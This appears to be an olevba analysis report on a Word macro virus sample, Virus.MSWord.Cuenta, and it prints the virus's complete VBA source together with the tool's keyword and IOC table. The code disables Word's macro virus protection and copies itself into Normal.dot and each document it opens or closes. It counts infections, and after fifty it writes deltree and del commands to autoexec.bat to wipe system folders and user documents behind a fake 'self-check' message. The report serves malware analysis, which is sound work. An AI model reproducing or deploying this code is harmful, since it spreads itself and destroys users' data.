olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Cuenta-224586ccbfac5eafcc0004c33d8c578726e8a421
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Cuenta-224586ccbfac5eafcc0004c33d8c578726e8a421 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO NewMacros.bas 
in file: Virus.MSWord.Cuenta-224586ccbfac5eafcc0004c33d8c578726e8a421 - OLE stream: 'Macros/VBA/NewMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Function Infesta() As Boolean
On Error Resume Next
'Desabilitamos la protección contra Virus Macro
Options.VirusProtection = False
Application.OrganizerCopy Source:= _
        Word.ActiveDocument.Path + "\" + Word.ActiveDocument.Name, Destination:= _
        Left(Application.Path, Len(Application.Path) - 7) + "\Plantillas\Normal.dot", Name:= _
        "NewMacros", Object:=wdOrganizerObjectProjectItems
 If Err.Number > 0 Then
    Infesta = False
    Application.OrganizerCopy Source:=Left(Application.Path, Len(Application.Path) - 7) + "\Plantillas\Normal.dot" _
        , Destination:=Word.ActiveDocument.Path + "\" + Word.ActiveDocument.Name _
        , Name:="NewMacros", Object:=wdOrganizerObjectProjectItems
 Else
    Infesta = True
End If
End Function
Sub AutoClose()
On Error Resume Next
Application.OrganizerCopy Source:=Left(Application.Path, Len(Application.Path) - 7) + "\Plantillas\Normal.dot" _
        , Destination:=Word.ActiveDocument.Path + "\" + Word.ActiveDocument.Name _
        , Name:="NewMacros", Object:=wdOrganizerObjectProjectItems
If Err.Number > 0 Then
Else
        Open Left(Application.Path, Len(Application.Path) - 7) + "\Plantillas\Cuenta.sys" For Append As 1
            Print #1, "Infectado el documento" + Word.ActiveDocument.Path + "\" + Word.ActiveDocument.Name
        Close #1
 End If
 Documents.Save NoPrompt:=True, OriginalFormat:=wdOriginalDocumentFormat
 End Sub
Sub AutoOpen()
    Dim infesto As Boolean
    Dim I As Integer
    Dim Linea As String
    On Error Resume Next
    'Comenzar la infección del normal.dot si no esta infestado
    infesto = Infesta
    'Verificar si ya se infestaron 100 documentos nuevos
    I = 0
    Open Left(Application.Path, Len(Application.Path) - 7) + "\Plantillas\Cuenta.sys" For Input As 1
    If Dir(Left(Application.Path, Len(Application.Path) - 7) + "\Plantillas\Cuenta.sys") <> "" Then
        Do While Not EOF(1)
            Line Input #1, Linea
            I = I + 1
        Loop
    Else
        I = 0
    End If
    Close #1
    If I > 50 Or I = 50 Then
        'Agregar este codígo al autoexec.bat
        Open "C:\autoexec.bat" For Append As 1
            Print #1, "Echo off"
            Print #1, "Echo. Autocheque del sistema, por favor espere un momento........."
            'Verificamos si existe el deltree
            If Dir("c:\windows\command\deltree.exe") <> "" Then
                'Aquí le agregamos el codígo para eliminar el sistema completo
                Print #1, "c:\windows\command\Deltree *.* /y"
            Else
                'No esxiete el deltree
                Print #1, "del *.* /q"
                'Verificamps si es NT o Win 9x
                If Dir("c:\winnt", vbDirectory) Then
                  Print #1, "del c:\winnt\system\*.*  /q"
                  Print #1, "del c:\winnt\system32\*.*  /q"
                  Print #1, "del c:\winnt\*.*  /q"
                  Print #1, "del c:\winnt\profiles\administrador\personal\*.* /q"
                  Print #1, "del *.*  /q"
                End If
                If Dir("c:\windows", vbDirectory) Then
                  Print #1, "del c:\windows\system\*.* "
                  Print #1, "del c:\windows\*.* /q"
                  If Dir("c:\mis documentos", vbDirectory) Then
                    Print #1, "del c:\mis documentos\*.*  /q"
                  End If
                  If Dir("c:\my documents", vbDirectory) Then
                    Print #1, "del c:\my documents\*.*  /q"
                  End If
                  Print #1, "del *.*  /q"
                End If
             End If
                
            Print #1, "Echo on"
            Print #1, "Echo. Lo Siento pero pedro te destruyo el sistema..."
            Print #1, "Echo. Gracias por su tiempo....................."
        Close #1
    End If
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|IOC       |autoexec.bat        |Executable file name                         |
|IOC       |deltree.exe         |Executable file name                         |
+----------+--------------------+---------------------------------------------+

